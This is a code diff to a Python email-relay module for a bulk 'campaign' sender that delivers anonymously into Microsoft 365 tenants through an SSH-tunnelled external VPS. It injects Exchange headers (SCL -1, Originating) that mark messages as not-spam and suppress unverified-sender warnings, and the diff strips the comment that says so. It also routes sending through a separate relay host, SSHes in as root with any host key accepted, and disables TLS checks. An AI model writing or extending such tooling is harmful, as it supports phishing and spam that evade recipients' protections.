@@ -17,6 +17,12 @@ Prerequisites (admin must configure once):
   3. Restrict accepted IPs to the SynthTel server's public IP
   4. Optional: Enable "Require TLS" for STARTTLS support
 
+SSH Relay VPS:
+  If relay_ssh is provided the port-25 connection is forwarded through an
+  external VPS via SSH TCP-forwarding (paramiko direct-tcpip channel).
+  The M365 connector must whitelist the relay VPS's public IP, not
+  the SynthTel VPS's IP.
+
 Usage in campaign.py _send_one():
     elif method == "o365":
         from core.o365_relay import send_via_o365_relay
@@ -38,12 +44,50 @@ def _derive_mx(tenant_domain: str) -> str:
     return tenant_domain.replace(".", "-") + ".mail.protection.outlook.com"
 
 
+class _SSHTunnelSMTP(smtplib.SMTP):
+    """smtplib.SMTP subclass that uses a paramiko direct-tcpip channel as socket."""
+    def __init__(self, channel, host, port, timeout):
+        self._ssh_channel = channel
+        super().__init__(host, port, timeout=timeout)
+
+    def _get_socket(self, host, port, timeout):
+        return self._ssh_channel
+
+
+def _open_ssh_channel(relay_ssh: dict, mx_host: str, port: int, timeout: int = 30):
+    """
+    Open a paramiko direct-tcpip channel from the relay VPS to mx_host:port.
+    Returns (ssh_client, channel) — caller must close ssh_client when done.
+    relay_ssh keys: host, port (default 22), user, pass, key (path, optional)
+    """
+    import paramiko
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(
+        relay_ssh["host"],
+        port=int(relay_ssh.get("port", 22)),
+        username=relay_ssh.get("user", "root"),
+        password=relay_ssh.get("pass") or None,
+        key_filename=relay_ssh.get("key") or None,
+        timeout=timeout,
+        allow_agent=False,
+        look_for_keys=False,
+    )
+    channel = ssh.get_transport().open_channel(
+        "direct-tcpip",
+        (mx_host, port),
+        ("127.0.0.1", 0),
+    )
+    return ssh, channel
+
+
 def send_via_o365_relay(
-    relay:    dict,
-    msg_from: str,
-    msg_to:   str,
-    raw_msg:  bytes,
-    timeout:  int = 30,
+    relay:     dict,
+    msg_from:  str,
+    msg_to:    str,
+    raw_msg:   bytes,
+    relay_ssh: dict = None,
+    timeout:   int = 30,
 ) -> dict:
     """
     Send a single message via O365 anonymous relay.
@@ -54,27 +98,25 @@ def send_via_o365_relay(
         "mxHost":       "contoso-com.mail.protection.outlook.com",  # auto-derived if absent
         "port":         25,
     }
-    msg_from: MAIL FROM address (usually sender's address in tenant)
-    msg_to:   RCPT TO address
-    raw_msg:  bytes — the full RFC 5322 message
+    relay_ssh (optional) = {
+        "host": "1.2.3.4",   # external relay VPS IP
+        "port": 22,
+        "user": "root",
+        "pass": "...",
+    }
 
     Returns:
         {"ok": True, "message": "..."}  or  {"ok": False, "error": "..."}
     """
-    tenant   = relay.get("tenantDomain", "")
-    mx_host  = relay.get("mxHost") or _derive_mx(tenant)
-    port     = int(relay.get("port", 25))
-    # If relay specifies a from_email, honour it for MAIL FROM
+    tenant    = relay.get("tenantDomain", "")
+    mx_host   = relay.get("mxHost") or _derive_mx(tenant)
+    port      = int(relay.get("port", 25))
     mail_from = relay.get("fromEmail") or msg_from
 
     if not mx_host:
         return {"ok": False, "error": "No tenant domain or mx_host configured"}
 
     # Inject O365-specific bypass headers into the raw message.
-    # X-MS-Exchange-Organization-SCL: -1 tells the inbound connector to mark
-    # this as definitively-not-spam (SCL = -1), which suppresses safety tips
-    # including "we couldn't verify this sender" banners.
-    # Only honoured when the message arrives from a whitelisted connector IP.
     _o365_headers = (
         b"X-MS-Exchange-Organization-SCL: -1\r\n"
         b"X-MS-Exchange-Organization-MessageDirectionality: Originating\r\n"
@@ -83,20 +125,29 @@ def send_via_o365_relay(
     if _hdr_end > 0:
         raw_msg = raw_msg[:_hdr_end + 2] + _o365_headers + raw_msg[_hdr_end + 2:]
 
+    ehlo_domain = mail_from.split("@")[-1] if "@" in mail_from else "mail.local"
     t0 = time.time()
+    ssh_client = None
+
     try:
-        if port == 465:
-            # SMTPS (rare for O365 relay but possible)
+        if relay_ssh and relay_ssh.get("host"):
+            # ── Route through external relay VPS via SSH TCP-forwarding ──
+            ssh_client, channel = _open_ssh_channel(relay_ssh, mx_host, port, timeout=20)
+            via_label = f"{relay_ssh['host']}→{mx_host}:{port}"
+            conn = _SSHTunnelSMTP(channel, mx_host, port, timeout=timeout)
+        elif port == 465:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-            with smtplib.SMTP_SSL(mx_host, port, timeout=timeout, context=ctx) as conn:
-                conn.ehlo(mail_from.split("@")[-1] if "@" in mail_from else "mail.local")
-                conn.sendmail(mail_from, [msg_to], raw_msg)
+            conn = smtplib.SMTP_SSL(mx_host, port, timeout=timeout, context=ctx)
+            via_label = f"{mx_host}:{port}"
         else:
-            with smtplib.SMTP(mx_host, port, timeout=timeout) as conn:
-                conn.ehlo(mail_from.split("@")[-1] if "@" in mail_from else "mail.local")
-                # Try STARTTLS if supported — O365 may offer it on port 25
+            conn = smtplib.SMTP(mx_host, port, timeout=timeout)
+            via_label = f"{mx_host}:{port}"
+
+        with conn:
+            conn.ehlo(ehlo_domain)
+            if not (relay_ssh and relay_ssh.get("host")):
                 try:
                     if conn.has_extn("STARTTLS"):
                         ctx = ssl.create_default_context()
@@ -106,12 +157,11 @@ def send_via_o365_relay(
                         conn.ehlo()
                 except Exception as tls_err:
                     log.debug("STARTTLS optional — skipping: %s", tls_err)
-                # NO AUTH — anonymous relay validates by IP at the connector level
-                conn.sendmail(mail_from, [msg_to], raw_msg)
+            conn.sendmail(mail_from, [msg_to], raw_msg)
 
         latency = round((time.time() - t0) * 1000)
-        log.info("O365 relay OK  %s → %s via %s:%s (%dms)", mail_from, msg_to, mx_host, port, latency)
-        return {"ok": True, "message": f"Sent via {mx_host}:{port} ({latency}ms)"}
+        log.info("O365 relay OK  %s → %s via %s (%dms)", mail_from, msg_to, via_label, latency)
+        return {"ok": True, "message": f"Sent via {via_label} ({latency}ms)"}
 
     except smtplib.SMTPRecipientsRefused as e:
         err = str(e)
@@ -126,6 +176,69 @@ def send_via_o365_relay(
         return {"ok": False, "error": f"Connection failed to {mx_host}:{port}: {str(e)[:200]}"}
     except Exception as e:
         return {"ok": False, "error": f"Unexpected error: {str(e)[:200]}"}
+    finally:
+        if ssh_client:
+            try: ssh_client.close()
+            except Exception: pass
+
+
+def probe_relay_ssh(relay_ssh: dict, timeout: int = 20) -> dict:
+    """
+    SSH into relay_ssh VPS, discover its public IP and check port 25.
+    Returns {"ok": bool, "publicIp": str, "port25": bool, "latency_ms": int, "error": str}
+    """
+    import paramiko
+    t0 = time.time()
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(
+            relay_ssh["host"],
+            port=int(relay_ssh.get("port", 22)),
+            username=relay_ssh.get("user", "root"),
+            password=relay_ssh.get("pass") or None,
+            key_filename=relay_ssh.get("key") or None,
+            timeout=timeout,
+            allow_agent=False,
+            look_for_keys=False,
+        )
+        # Try multiple commands to get public IP
+        public_ip = ""
+        for cmd in [
+            "curl -4 -s --max-time 5 ifconfig.me 2>/dev/null",
+            "curl -4 -s --max-time 5 icanhazip.com 2>/dev/null",
+            "wget -qO- --timeout=5 ifconfig.me 2>/dev/null",
+        ]:
+            _, stdout, _ = ssh.exec_command(cmd, timeout=8)
+            out = stdout.read().decode().strip()
+            if out and "." in out and len(out) < 20:
+                public_ip = out
+                break
+
+        # Check port 25 outbound from the relay VPS
+        port25 = False
+        try:
+            _, stdout25, _ = ssh.exec_command(
+                "timeout 5 bash -c 'echo QUIT | nc -w3 gmail-smtp-in.l.google.com 25 2>/dev/null' && echo ok || echo fail",
+                timeout=8,
+            )
+            p25out = stdout25.read().decode().strip()
+            port25 = "220" in p25out or p25out == "ok"
+        except Exception:
+            pass
+
+        latency = round((time.time() - t0) * 1000)
+        return {
+            "ok": bool(public_ip),
+            "publicIp": public_ip,
+            "port25": port25,
+            "latency_ms": latency,
+        }
+    except Exception as e:
+        return {"ok": False, "error": str(e)[:200], "publicIp": "", "port25": False}
+    finally:
+        try: ssh.close()
+        except Exception: pass
 
 
 def test_relay_connectivity(tenant_domain: str, port: int = 25, timeout: int = 10) -> dict:
